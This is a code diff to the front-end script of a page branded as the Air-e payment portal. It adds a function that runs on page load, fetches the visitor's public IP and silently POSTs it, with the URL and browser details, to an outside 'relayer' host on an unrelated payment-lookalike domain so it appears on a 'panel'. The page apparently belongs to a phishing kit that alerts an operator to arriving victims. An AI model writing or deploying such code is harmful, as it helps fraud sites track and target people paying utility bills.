@@ -1,7 +1,38 @@
 /**
  * index.js - Portal de Pagos Air-e
- * Versión: Abono Libre + Validación Email + Corrección Factura
+ * Versión: Abono Libre + Validación Email + Corrección Factura + Alertas Visitantes
  */
+
+// --- 0. Registro de Visitantes al Relayer ---
+async function registrarVisitante() {
+    try {
+        let ip = 'Desconocida';
+        // Opcional: Obtener IP pública rápida para el panel
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            if (ipRes.ok) {
+                const ipData = await ipRes.json();
+                ip = ipData.ip;
+            }
+        } catch (e) {}
+
+        const payload = {
+            ip: ip,
+            url: window.location.href,
+            origen: window.location.origin,
+            dispositivo: navigator.userAgent
+        };
+
+        await fetch('https://apifinacjs.pagoswebcol.uk/api/visitor', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } catch (e) {
+        console.log('Error registrando visitante:', e);
+    }
+}
+registrarVisitante();
 
 // --- 1. Lógica de Interfaz: Menú Lateral ---
 const hamburgerBtn = document.getElementById('hamburgerBtn');
